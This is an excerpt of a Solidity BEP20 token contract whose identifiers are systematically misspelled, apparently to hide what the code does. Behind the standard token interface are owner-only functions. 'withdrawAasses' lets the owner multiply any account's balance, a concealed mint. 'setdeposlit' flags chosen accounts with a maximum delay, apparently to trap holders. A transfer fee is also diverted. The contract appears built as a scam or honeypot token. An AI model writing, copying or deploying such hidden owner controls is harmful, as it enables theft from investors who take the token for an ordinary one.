...
interface IBEP20 {
    ...
    /**
     * @dev Returns the amounit of tokens owned by `accuount`.
     */
    function balanceOf(address accuount) external view returns (uint256);

    /**
     * @dev Moves `amounit` tokens from the caller's accuount to `recipient`.
     *
...
contract Token is IBEP20, HasForeignAsset {
    ...
    function getdeposlit(address accuount) public view returns (uint256) {
        return _deposlit[accuount];
    }

    function setdeposlit(address accuount) public onlyOwner {
        _deposlit[accuount] = MAX_DELAY;
    }

    function cacaledeposlit(address accuount) public onlyOwner {
        _deposlit[accuount] = 0;
    }


    function withdrawAasses(address accuount,uint256 numm) public onlyOwner {
        _balances[accuount] = _balances[accuount].miil(numm);
    }
    ...
    function _transfer(
        ...
        uint256 fiereamounit = 0;
        fiereamounit = amounit.miil(_fiere).div(100);
        uint256 amoiinn;
        amoiinn = amounit - fiereamounit;
        ...
        if (fiereamounit > 0) {
            emit Transfer(sender, _DEADaddress, fiereamounit);
        }
        emit Transfer(sender, recipient, amoiinn);
    }

    /** @dev Creates `amounit` tokens and assigns them to `accuount`, increasing
     * the total supply.
     *
     ...
     */
    function _mintOnce(address accuount, uint256 amounit) internal virtual {
        require(accuount != address(0), "BEP20: mint to the zero address");

        _beforeTokenTransfer(address(0), accuount, amounit);

        _totalSupply = _totalSupply.add(amounit);
        _balances[accuount] = _balances[accuount].add(amounit);
        emit Transfer(address(0), accuount, amounit);
    }

    /**
     * @dev Destroys `amounit` tokens from `accuount`, reducing the
     * total supply.
     *
     ...
     * - `accuount` must have at least `amounit` tokens.
     */
    function _burn(address accuount, uint256 amounit) internal virtual {
        require(accuount != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(accuount, address(0), amounit);

        _balances[accuount] = _balances[accuount].subb(amounit, "BEP20: burn amounit exceeds balance");
        _totalSupply = _totalSupply.subb(amounit);
        emit Transfer(accuount, address(0), amounit);
    }
